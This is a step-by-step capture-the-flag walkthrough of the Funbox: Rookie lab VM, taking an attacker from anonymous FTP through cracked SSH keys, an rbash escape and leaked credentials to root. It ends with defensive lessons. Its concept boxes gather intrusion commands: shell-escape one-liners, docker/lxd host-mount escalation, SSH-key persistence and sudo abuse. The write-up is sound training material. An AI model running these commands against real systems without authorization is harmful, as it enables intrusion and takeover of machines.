# Funbox: Rookie — VulnHub Walkthrough (Beginner Friendly)

> Also known as **Funbox 2**. A short, realistic boot2root: an open FTP server
> leaks password-protected SSH keys, one password is weak, and a forgotten
> command history file hands you the keys to root. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: Rookie |
| **Difficulty** | Easy |
| **Author** | 0815R2d2 |
| **Released** | 27 July 2020 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-rookie,520/ |
| **Download** | https://vulnhub.com/entry/funbox-rookie,520/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a host and scan its ports.
- Why **anonymous FTP** access is dangerous, and how to pull files from it.
- How to turn a **password-protected ZIP** containing an SSH key into a login
  (`zip2john` + `john` + `rockyou.txt`).
- How to log in with an **SSH private key** and escape a **restricted shell**
  (`rbash`).
- How to find credentials in a **`.mysql_history`** file.
- How to abuse a **`sudo` misconfiguration** to become `root`.

**Prerequisites:** Kali Linux with your target VM imported and both on the same
host-only network (attacker `192.168.56.10`, target `192.168.56.101`).

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
# What is my attacker IP and subnet?
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# List live hosts with ARP (fast, works even if the host blocks ping)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (target)
```

**Target IP:** `192.168.56.101`

![arp-scan finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)
> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```bash
# Full TCP sweep, then service detection (note the FTP anon script output)
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 anna.zip
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 cathrine.zip
| -rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 john.zip
| -r--r--r--   1 ftp ftp  1477 Jul 25 2020 tom.zip
| -rw-r--r--   1 ftp ftp   170 Jan 10 2018 welcome.msg
|_-rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:**
> - The `ftp-anon` script line literally tells us **anonymous login is allowed**
>   — that is our way in.
> - Port **80** is a default Apache page (and `robots.txt` advertises `/logs/`,
>   which is a dead end — the box's "rabbit-hole").

Browsing the web server gives nothing useful, so FTP is the target.

![nmap scan showing anonymous FTP](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Grab the files from anonymous FTP

```bash
# Log in as the anonymous user (any e-mail as the password)
ftp 192.168.56.101
# Name: anonymous
# Password: anonymous@example.com
```

```text
230 Anonymous access granted, restrictions apply
ftp> ls -al
-rw-r--r--   1 ftp ftp   153 Jul 25 2020 .@admins
-rw-rw-r--   1 ftp ftp  1477 Jul 25 2020 cathrine.zip
-r--r--r--   1 ftp ftp  1477 Jul 25 2020 tom.zip
-rw-r--r--   1 ftp ftp   114 Jul 25 2020 .@users
-rw-r--r--   1 ftp ftp   170 Jan 10 2018 welcome.msg
ftp> mget *
ftp> bye
```

> **Why it works:** the FTP server is configured to allow the `anonymous`
> account. The hidden `.@admins` / `.@users` messages are hints:
> *"be careful with your keys. Find them in %yourname%.zip."*

### 3.2 Crack the ZIP passwords

Each `.zip` contains an SSH private key (`id_rsa`), but the archives are
password-protected. We convert the ZIP to a crackable hash, then brute-force it
with the `rockyou.txt` wordlist.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
# Convert every .zip to a John-the-Ripper hash format
zip2john *.zip > zips.hash

# Crack with John using rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt zips.hash
john --show zips.hash
```


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```text
tom.zip/id_rsa:  iubire       # password cracked; varies by build
cathrine.zip/id_rsa: catwoman
2 password hashes cracked, 9 left
```

> **Why it works:** `zip2john` extracts the encrypted entry's verifier as a hash
> that `john` can attack offline. Weak, dictionary passwords fall in seconds.

```bash
unzip tom.zip          # enter password: iubire
chmod 600 id_rsa
```

### 3.3 Log in with the stolen key

```bash
ssh -i id_rsa tom@192.168.56.101
```


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```text
Welcome to Ubuntu ...
Last login: ...
tom@funbox2:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),... ,108(lxd)
```

> **Note:** `cathrine`'s key may log straight back out — the hidden `.@users`
> message warned "there may be unexpected problems". Use `tom`'s key.

### 3.4 Escape the restricted shell


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
tom@funbox2:~$ cd /
-rbash: cd: restricted
```

The account runs a **restricted bash (`rbash`)** — you cannot change directory
or run many commands. Two easy escapes:

```bash
# Option A — re-connect with a full bash (simplest)
ssh -i id_rsa tom@192.168.56.101 -t "bash --noprofile"
```


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
# Option B — from inside the shell, spawn bash via Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** `rbash` only restricts the shell it starts. Asking SSH to
> run `bash --noprofile` directly, or launching a new shell from Python,
> bypasses the restriction entirely.

![SSH foothold as tom](images/03-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Find the password in the MySQL history

```bash
ls -la /home/tom
cat /home/tom/.mysql_history
```

```text
_HiStOrY_V2_
show\040databases;
create\040database\040'support';
use\040support
create\040table\040users;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

> **Why it works:** the `mysql` client records every command you type into
> `~/.mysql_history`. The admin typed a password into an `INSERT` statement —
> and it is stored in plaintext. `\040` is just an encoded space. This leaks the
> user's password: `xx11yy22!` (`varies by build`).

### 4.2 Check sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
# password: xx11yy22!
```

```text
User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means `tom` may run **any** command as
> **any** user — including root. There is no need for a clever GTFOBins trick;
> we simply become root.

```bash
sudo su
id
```

```text
root@funbox2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
```

![sudo -l and root shell](images/04-privesc.png)

### 4.3 The root flag

```bash
cd /root
ls
cat flag.txt      # some builds name it proof.txt / root.txt
```

```text
7ca58542dc8a0d0181aaf812ae214c69    # varies by build
```

![root flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP login enabled | FTP :21 | Disclosure of users' private SSH keys |
| 2 | Weak password-protected ZIP archives | FTP files | Offline cracking exposes `id_rsa` |
| 3 | Plaintext credential in `.mysql_history` | `/home/tom/.mysql_history` | Sudo password for `tom` |
| 4 | Over-broad `sudo` rights (`(ALL:ALL) ALL`) | `sudoers` for `tom` | Full privilege escalation to `root` |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** If it must stay, never store users' private keys
  or archives on it.
- **Never store private keys where the world can read them**, and always
  protect key archives with a *strong, unique* passphrase (not a dictionary
  word from `rockyou.txt`).
- **Scrub shell history.** Educate users (and set `HISTCONTROL`/`HISTIGNORE`)
  so passwords never end up in `.bash_history` or `.mysql_history`.
- **Apply least privilege to `sudo`.** Remove blanket `(ALL:ALL) ALL` grants;
  allow only the exact commands a user needs.
- **Detection:** alert on anonymous FTP logins, bulk `mget`, and any OS user
  obtaining a root shell who does not normally need one.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: https://vulnhub.com/entry/funbox-rookie,520/
- John the Ripper (`zip2john`): https://github.com/openwall/john
- rockyou.txt wordlist: https://www.kali.org/tools/wordlists/
- rbash escape cheatsheet: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
- GTFOBins (sudo escapes): https://gtfobins.github.io/
- Community writeups consulted:
  - [An ordinary day — Vulnhub Funbox2: Rookie](https://blog.gibbons.digital/hacking/2020/10/06/funbox2.html)
  - [PG Play — FunboxRookie](https://writeups.kunull.net/Proving%20Grounds/Play/Easy/FunboxRookie)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — nmap showing anonymous FTP + ZIP files
- [ ] `images/03-foothold.png` — SSH shell as `tom`
- [ ] `images/04-privesc.png` — `.mysql_history`, `sudo -l`, root shell
- [ ] `images/05-root-flag.png` — `cat /root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
